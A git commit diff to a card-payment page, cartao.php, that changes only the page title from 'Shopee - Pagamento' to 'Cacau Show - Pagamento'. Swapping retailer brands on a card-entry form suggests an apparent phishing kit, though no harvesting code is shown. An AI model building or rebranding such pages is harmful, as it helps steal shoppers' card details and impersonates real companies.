7ae1abebb513610ef898524a91f3429d50aa35a4
MariaClaraDev11 <MARIAZONA111@proton.me>
2025-04-21 00:21:31 -0300

    Update cartao.php

--- cartao.php
+++ cartao.php
@@ -18,7 +18,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Shopee - Pagamento</title>
+  <title>Cacau Show - Pagamento</title>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&display=swap">
   <style>
     body {
